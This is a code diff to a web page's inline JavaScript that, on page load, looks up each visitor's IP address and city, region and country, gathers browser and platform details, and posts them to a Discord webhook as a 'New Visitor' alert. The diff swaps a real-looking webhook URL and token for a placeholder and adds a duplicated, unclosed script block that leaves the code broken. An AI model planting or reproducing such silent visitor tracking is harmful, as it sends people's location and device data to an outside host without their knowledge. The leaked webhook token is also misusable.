@@ -271,14 +271,22 @@ fetch("https://api.ipify.org?format=json")
   .then(res => res.json())
   .then(data => {
 
+<script>
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+
     const info = {
       ip: data.ip,
+      town: data.city,
+      region: data.region,
+      country: data.country_name,
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       time: new Date().toLocaleString()
     };
 
-    fetch("https://discord.com/api/webhooks/1485257630971723857/BsUSqz-UuiiuQqxrAJERN-AjbKVnmiOEg_g59dorUV9UndpskJDtrL1a0cVaFR_NnXPN", {
+    fetch("YOUR_WEBHOOK_URL_HERE", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -287,6 +295,9 @@ fetch("https://api.ipify.org?format=json")
         content:
 `👀 **New Visitor**
 🌐 IP: ${info.ip}
+🏠 Town: ${info.town}
+📍 Region: ${info.region}
+🌍 Country: ${info.country}
 💻 Device: ${info.platform}
 🧠 Browser: ${info.userAgent}
 ⏰ Time: ${info.time}`
